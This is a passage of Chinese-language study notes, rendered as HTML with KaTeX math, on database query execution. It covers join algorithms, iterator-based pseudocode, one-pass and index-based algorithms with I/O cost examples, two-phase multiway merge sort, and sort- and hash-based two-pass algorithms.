mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05764em;">S</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq></p><h4 id="%EF%BC%885%EF%BC%89%E8%BF%9E%E6%8E%A5%E6%93%8D%E4%BD%9C%E7%9A%84%E5%8D%8A%E4%B8%BB%E5%AD%98%E5%AE%9E%E7%8E%B0%E7%AE%97%E6%B3%95" tabindex="-1">（5）连接操作的半主存实现算法</h4><p>内存只能装入一个关系的所有块的条件下</p><p>先将一个装入内存，再将另一个关系的所有快一个个的放入内存进行连接</p><h4 id="%EF%BC%886%EF%BC%89%E8%BF%9E%E6%8E%A5%E6%93%8D%E4%BD%9C%E7%9A%84%E5%A4%A7%E5%85%B3%E7%B3%BB%E5%AE%9E%E7%8E%B0%E7%AE%97%E6%B3%95" tabindex="-1">（6）连接操作的大关系实现算法</h4><p>此时内存不能装入任一关系的所有快。</p><p>此时先将内存装一个关系得所有快，每次装得只剩两个块得位置，装入多次，剩下两个一个用作输出，一个依次输入另一个关系得所有快，依次来进行连接操作</p><h4 id="%EF%BC%887%EF%BC%89%E8%BF%9E%E6%8E%A5%E6%93%8D%E4%BD%9C%E7%9A%84%E5%85%B6%E4%BB%96%E6%96%B9%E6%B3%95" tabindex="-1">（7）连接操作的其他方法</h4><ul><li>归并排序</li><li>散列排序</li><li>索引连接算法</li></ul><h3 id="1903-%E5%88%A9%E7%94%A8%E8%BF%AD%E4%BB%A3%E5%99%A8%E6%9E%84%E9%80%A0%E6%9F%A5%E8%AF%A2%E5%AE%9E%E7%8E%B0%E7%AE%97%E6%B3%95" tabindex="-1">1903 利用迭代器构造查询实现算法</h3><h4 id="%EF%BC%881%EF%BC%89%E8%BF%AD%E4%BB%A3%E5%99%A8%E7%AE%97%E6%B3%95%E7%9A%84%E6%8F%90%E5%87%BA" tabindex="-1">（1）迭代器算法的提出</h4><ul><li>查询实现的两种策略<ul><li>物化计算策略：每一步将所有中间值得出再进行下一步</li><li>流水线计算策略，每得到的元组依次经过查询条件得到结果</li></ul></li><li>区别<ul><li>是一个关系操作还是一组关系操作</li><li>中间的结果是否完整的存储</li></ul></li></ul><p>迭代器算法在流水线计算策略中实现</p><h4 id="%EF%BC%882%EF%BC%89%E8%BF%AD%E4%BB%A3%E5%99%A8%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80" tabindex="-1">（2）迭代器算法基础</h4><p>迭代器：迭代的读取一个集合中的每一个元素，而封装其读取细节</p><p>有一个抽象类：</p><pre><code class="language-C++">class iterator&#123;  void Open();  tuple GetNext();  void Close();  iterator &amp;inputs[];&#125; </code></pre><p>所有的关系操作可继承此迭代器进行构造。<br>不同操作，可以构造不同的Open(),GetNext(),Close()函数</p><h4 id="%EF%BC%883%EF%BC%89%E8%BF%AD%E4%BB%A3%E5%99%A8%E7%9A%84%E6%9E%84%E9%80%A0" tabindex="-1">（3）迭代器的构造</h4><p>迭代器示例：表空间扫描发–读取关系</p><pre><code class="language-C++">Open()&#123;  b:=R的第一块  t:=b的第一个元组&#125;GetNext()&#123;  IF(t已经超过块b的最后一个元组)&#123;    将b前进到下一块    IF(没有下一块)      return NotFound;    ELSE/*b是一个新块*/      t:=b的第一个元组  &#125;  oldt:=t  将t前进到b的下一元组  RETURN oldt;&#125;Close()&#123;&#125;</code></pre><p>迭代器示例：R并S算法</p><pre><code class="language-C++">Open()&#123;  R.Open();  CurRel:=R;&#125;GetNext()&#123;  IF(CurRel==R)&#123;    t:=R.GetNext();    IF(t&lt;&gt;NotFound)      RETURN t;    ELSE&#123;      s.Open();      curRel:=S;    &#125;  &#125;  RETURN S.GetNext();&#125;Close()&#123;R.close();S.close();&#125;</code></pre><h3 id="1904-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9F%A5%E8%AF%A2%E7%9A%84%E4%B8%80%E8%B6%9F%E6%89%AB%E6%8F%8F%E7%AE%97%E6%B3%95" tabindex="-1">1904 数据库查询的一趟扫描算法</h3><h4 id="%EF%BC%881%EF%BC%89%E4%BB%80%E4%B9%88%E6%98%AF%E4%B8%80%E8%B6%9F%E7%AE%97%E6%B3%95" tabindex="-1">（1）什么是一趟算法</h4><p>内存能放下关系的所有块，即只需要调用一次数据库的算法。</p><h4 id="%EF%BC%882%EF%BC%89%E5%85%B3%E7%B3%BB%2F%E8%A1%A8%E6%95%B0%E6%8D%AE%E7%9A%84%E8%AF%BB%E5%8F%96" tabindex="-1">（2）关系/表数据的读取</h4><h5 id="%E8%81%9A%E7%B0%87%E5%85%B3%E7%B3%BB" tabindex="-1">聚簇关系</h5><p>下文中B（R）是R的存储块的数目，T（R）是R的元组数目，M是内存能放下的块的数目</p><ul><li>关系的元组集中存放（一个块中仅是一个关系的元组）<ul><li>TableScan® 表空间扫描算法<br>扫描结构未排序：B（R）</li><li>SortTableScan®<br>扫描结构排序：3B（R）</li><li>IndexScan® 索引扫描算法<br>扫描结果未排序：B（R）</li><li>SortIndexScan®<br>扫描结果排序 B® or 3 B®</li></ul></li></ul><h5 id="%E9%9D%9E%E8%81%9A%E7%B0%87%E5%85%B3%E7%B3%BB" tabindex="-1">非聚簇关系</h5><ul><li><p>关系的元组不一定集中存放</p></li><li><p>扫描结果未排序：T®</p></li><li><p>扫描结果排序：T®+2B®</p></li></ul><h4 id="%EF%BC%883%EF%BC%89%E6%95%B4%E4%B8%AA%E5%85%B3%E7%B3%BB%E7%9A%84%E4%B8%80%E5%85%83%E6%93%8D%E4%BD%9C%E7%AE%97%E6%B3%95" tabindex="-1">（3）整个关系的一元操作算法</h4><ul><li><p>需要在内存中保存已经处理过的元组</p></li><li><p>当新元组到达时，需要和之前处理过的元组进行比较</p></li><li><p>建立不同的内存数据结构，来保存之前处理过的数据，以便快速处理整个关系上的操作</p></li><li><p>算法复杂性：B（R）</p></li><li><p>应用条件：B(&amp;R)&lt;=M</p></li><li><p>去重复 &amp;®，分组聚集<br>可以在内存中采取散列的数据结构，达到快速插入，快速定位的效果</p></li></ul><h4 id="%EF%BC%884%EF%BC%89%E6%95%B4%E4%B8%AA%E5%85%B3%E7%B3%BB%E7%9A%84%E4%BA%8C%E5%85%83%E6%93%8D%E4%BD%9C%E5%AE%9E%E7%8E%B0%E7%AE%97%E6%B3%95" tabindex="-1">（4）整个关系的二元操作实现算法</h4><ul><li>扫描一个关系，再扫描另一个关系</li><li>集合的操作需要去重；包的操作需要做计数</li><li>算法复杂度：B®+B(S)</li><li>应用条件:min(B®,B(S))&lt;=M</li></ul><h3 id="1905-%E5%9F%BA%E4%BA%8E%E7%B4%A2%E5%BC%95%E7%9A%84%E7%AE%97%E6%B3%95" tabindex="-1">1905 基于索引的算法</h3><h4 id="%EF%BC%881%EF%BC%89%E5%9F%BA%E4%BA%8E%E7%B4%A2%E5%BC%95%E7%9A%84%E9%80%89%E6%8B%A9%E7%AE%97%E6%B3%95" tabindex="-1">（1）基于索引的选择算法</h4><ul><li>选择条件中有涉及到索引属性时，可以使用索引，辅助快速索引</li><li>聚簇和非聚簇索引，使用时效率不一样</li><li>可能在多个属性上都存在索引</li></ul><p>索引应用分析示例：<br>假设B®=1000，T®=20000，即有20 000 个元组放到1000个块中。a是R的一个属性，在a上有一个索引，考虑 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>σ</mi><mrow><mi>a</mi><mo>=</mo><mn>0</mn></mrow></msub><mo stretchy="false">(</mo><mi>R</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\sigma_{a=0}(R)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="mrel mtight">=</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mclose">)</span></span></span></span></eq>操作</p><ul><li>如果R是聚簇的，且不使用索引，查询代价1000I/O</li><li>如果R不是聚簇的，且不使用索引，查询代价20000</li><li>如果V(R,a)=100（表示a只有100个不同的大小）,且索引是聚簇的，查询代价 即a=0d的元组所在的总共的块数，平均1000/100=10。</li><li>如果V(R,a)=100且索引是非聚簇的，查询代价平均20000/100=200</li><li>如果V(R,a)=20000，即a是关键字，查询代价为1</li></ul><h4 id="%EF%BC%882%EF%BC%89%E5%9F%BA%E4%BA%8E%E6%9C%89%E5%BA%8F%E7%B4%A2%E5%BC%95%E7%9A%84%E8%BF%9E%E6%8E%A5%E7%AE%97%E6%B3%95%EF%BC%88zig-zag%E8%BF%9E%E6%8E%A5%E7%AE%97%E6%B3%95%EF%BC%89" tabindex="-1">（2）基于有序索引的连接算法（Zig-Zag连接算法）</h4><p>略难，跳，对应书P122</p><h3 id="1906-%E5%9B%9E%E9%A1%BE" tabindex="-1">1906 回顾</h3><ul><li><p>查询实现算法的基本思维</p></li><li><p>连接的逻辑实现算法</p></li><li><p>连接的物理实现算法</p><ul><li>如何降低磁盘I/O</li><li>充分利用内存，减少循环量</li><li>如何降低内存的查找量</li><li>建立合适的数据结构</li></ul></li><li><p>一趟算法：只要有一个关系能够全部装入内存即可实施<br>需要用一些算法</p><ul><li>迭代器算法</li><li>基于散列的算法</li><li>基于排序的算法</li><li>基于索引的算法</li></ul></li></ul><h3 id="2001-%E4%B8%A4%E8%B6%9F%E6%89%AB%E6%8F%8F%E7%AE%97%E6%B3%95%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%80%9D%E6%83%B3" tabindex="-1">2001 两趟扫描算法的基本思想</h3><h4 id="%EF%BC%881%EF%BC%89%E6%95%B4%E4%B8%AA%E5%85%B3%E7%B3%BB%E6%93%8D%E4%BD%9C%E5%AD%98%E5%9C%A8%E7%9A%84%E9%97%AE%E9%A2%98" tabindex="-1">（1）整个关系操作存在的问题</h4><ul><li>对于一个关系，可能不能将整个关系都放入内存中，一趟算法已经不能实施</li></ul><h4 id="%EF%BC%882%EF%BC%89%E4%B8%A4%E8%B6%9F%E7%AE%97%E6%B3%95%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF" tabindex="-1">（2）两趟算法的基本思路</h4><ul><li>第一趟：划分子集，使得子集具有某种特性，如有序或相同散列值</li><li>第二趟：处理全局性内容的操作，形成结果关系。如多子集间的归并排序，相同的散列值子集的操作等</li></ul><p>可实现原因：大数据集上的操作可以等价于子集上操作的并集</p><h3 id="2002-%E4%B8%A4%E9%98%B6%E6%AE%B5%E5%A4%9A%E8%B7%AF%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F" tabindex="-1">2002 两阶段多路归并排序</h3><h4 id="%EF%BC%881%EF%BC%89-%E5%86%85%E6%8E%92%E5%BA%8F%E5%92%8C%E5%A4%96%E6%8E%92%E5%BA%8F" tabindex="-1">（1） 内排序和外排序</h4><ul><li>内排序问题：待排序的数据可以一次性地装入内存中，即排序者可以完整地看到和操纵所有数据。内存中的排序算法：插入排序，冒牌排序</li><li>外排序问题：待排序的数据不能一次性地装入内存，即排序者不能一次完整地看到和操纵所有地数据，需要将数据分批次装入内存分批处理地排序问题。</li></ul><h4 id="%EF%BC%882%EF%BC%89%E4%B8%A4%E9%98%B6%E6%AE%B5%E5%A4%9A%E8%B7%AF%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F" tabindex="-1">（2）两阶段多路归并排序</h4><p>全称TPMMS， Two-Phase Multi-way Merge Sort based join<br>两阶段多路归并排序是一种外排序。<br>现在假设内存大小x块，待排序数据要y块，y&gt;x。</p><ol><li>首先将要排序的数据划分为n份，x*n&gt;y</li><li>依次将分好的子集放入内存中进行内排序</li><li>随后将排序好的子集，对于所有的子集每次取一块放入内存中，将最小值或最大值取出后放入内存，原来的数据删除</li><li>内存中存在个子集中最小的元素，此时进行内排序，排序后的结果输入到新的外部存储中</li><li>重复4，5直至数据全部排序完</li></ol><p>算法效率：</p><ul><li><p>子集和排序阶段读一遍写一遍</p></li><li><p>归并阶段读一遍写一遍</p></li><li><p>总I/O次数4B®</p></li><li><p>算法应用条件：</p><ul><li>子集合数&lt;<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>B</mi><mrow><mi>m</mi><mi>e</mi><mi>r</mi><mi>m</mi><mi>o</mi><mi>r</mi><mi>y</mi></mrow></msub></mrow><annotation encoding="application/x-tex">B_{mermory}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">er</span><span class="mord mathnormal mtight">m</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">ory</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span></eq></li><li>子集和块数&lt;<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>B</mi><mrow><mi>m</mi><mi>e</mi><mi>r</mi><mi>m</mi><mi>o</mi><mi>r</mi><mi>y</mi></mrow></msub></mrow><annotation encoding="application/x-tex">B_{mermory}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">er</span><span class="mord mathnormal mtight">m</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">ory</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span></eq></li><li>大数据集块数&lt;<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>B</mi><mrow><mi>m</mi><mi>e</mi><mi>r</mi><mi>m</mi><mi>o</mi><mi>r</mi><mi>y</mi></mrow><mn>2</mn></msubsup></mrow><annotation encoding="application/x-tex">B_{mermory}^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1972em;vertical-align:-0.3831em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-2.453em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">er</span><span class="mord mathnormal mtight">m</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">ory</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3831em;"><span></span></span></span></span></span></span></span></span></span></eq></li></ul></li></ul><h4 id="%EF%BC%883%EF%BC%89%E6%9B%B4%E5%A4%A7%E8%A7%84%E6%A8%A1%E7%9A%84%E5%A4%9A%E9%98%B6%E6%AE%B5%E5%BD%92%E5%B9%B6%E7%AE%97%E6%B3%95" tabindex="-1">（3）更大规模的多阶段归并算法</h4><ul><li>设内存大小 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>B</mi><mrow><mi>m</mi><mi>e</mi><mi>r</mi><mi>m</mi><mi>o</mi><mi>r</mi><mi>y</mi></mrow></msub><mo>=</mo><mn>3</mn></mrow><annotation encoding="application/x-tex">B_{mermory}=3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">er</span><span class="mord mathnormal mtight">m</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">ory</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">3</span></span></span></span></eq></li><li>待排序数据 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>B</mi><mrow><mi>p</mi><mi>r</mi><mi>o</mi><mi>b</mi><mi>l</mi><mi>e</mi><mi>m</mi></mrow></msub></mrow><annotation encoding="application/x-tex">B_{problem}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">ro</span><span class="mord mathnormal mtight">b</span><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span></eq>=30$</li></ul><p>基本策略</p><ul><li>30块数据集-&gt;10个子集和，每个子集合3块，排序并存储</li><li>10个已经排序的子集合再分为5组进行二路归并排序，得到5个排序好的子集合</li><li>5个集合再分为3组，进行归并排序；最后得到3个排好序的子集和</li><li>再归并即可得到最终的排序</li></ul><h3 id="2003-%E5%9F%BA%E4%BA%8E%E6%8E%92%E5%BA%8F%E7%9A%84%E4%B8%A4%E8%B6%9F%E6%89%AB%E6%8F%8F%E7%AE%97%E6%B3%95" tabindex="-1">2003 基于排序的两趟扫描算法</h3><h4 id="%EF%BC%881%EF%BC%89%E6%93%8D%E4%BD%9C" tabindex="-1">（1）操作</h4><p>去重复，聚集 复杂度等同TPMMS</p><ul><li>并<ul><li>包上直接合并即可，无需两趟</li><li>集合上需要两趟，需要去重<ul><li>效果同TPMMS</li></ul></li></ul></li><li>交，差<ul><li>包上和集合上都要两趟，需要处理出现次数或者去重复，效果同TPMMS</li></ul></li><li>连接运算<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><msub><mo>⋈</mo><mrow><mi>R</mi><mi mathvariant="normal">.</mi><mi>Y</mi><mo>=</mo><mi>S</mi><mi mathvariant="normal">.</mi><mi>Y</mi></mrow></msub><mi>S</mi></mrow><annotation encoding="application/x-tex">R\Join_{R.Y=S.Y} S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel">⋈</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span><span class="mord mtight">.</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">Y</span><span class="mrel mtight">=</span><span class="mord mathnormal mtight" style="margin-right:0.05764em;">S</span><span class="mord mtight">.</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">Y</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></eq><ul><li>第一趟：划分R和S的子表并进行子表排序，排序均基于Y属性排序</li><li>第二趟，归并时注意是R的输入还是S的输入。R和S的两路输入之间进行连接检查后连接后输出</li><li>又称“排序-连接”算法</li></ul></li></ul><h3 id="2004-%E5%9F%BA%E4%BA%8E%E6%95%A3%E5%88%97%E7%9A%84%E4%B8%A4%E8%B6%9F%E6%89%AB%E6%8F%8F%E7%AE%97%E6%B3%95" tabindex="-1">2004 基于散列的两趟扫描算法</h3><h4 id="%EF%BC%881%EF%BC%89%E5%9F%BA%E6%9C%AC%E6%80%9D%E6%83%B3" tabindex="-1">（1）基本思想</h4><ul><li>第一趟：散列子表，用散列函数<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>h</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">h_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9805em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span></eq>将原始关系划分为<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">M-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span></eq>个子表并存储（剩一个用来输出）</li><li>第二趟：处理每个子表，用另一散列函数<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>h</mi><mi>r</mi></msub></mrow><annotation encoding="application/x-tex">h_r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>将子表读入内存并建立内存结构，进行不同操作的处理</li></ul><h4 id="%EF%BC%882%EF%BC%89%E5%AE%9E%E4%BE%8B" tabindex="-1">（2）实例</h4><ul><li>去重复操作<ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>H</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">H_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span></eq>计算元组部分属性的值<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>o</mi><mi>d</mi><mi>M</mi></mrow><annotation encoding="application/x-tex">modM</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span></eq>,将可能重复的元组散列到同一子表中</li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>H</mi><mi>r</mi></msub></mrow><annotation encoding="application/x-tex">H_r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>计算整个元组的值<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>o</mi><mi>d</mi><mi>M</mi></mrow><annotation encoding="application/x-tex">modM</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span></eq>，将可能重复的元组散列到同一内存中</li><li>元组在子表上不重复，则在大关系中不重复</li><li>算法复杂度：4B®</li></ul></li><li>分组操作<ul><li>第一趟：将原始关系通过<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>h</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">h_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9805em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span></eq>散列成m-1个子表，并进行存储</li><li>第二趟：处理每个子表。将每个子表读入内存，并用另一函数<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>h</mi><mi>r</mi></msub></mrow><annotation encoding="application/x-tex">h_r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span 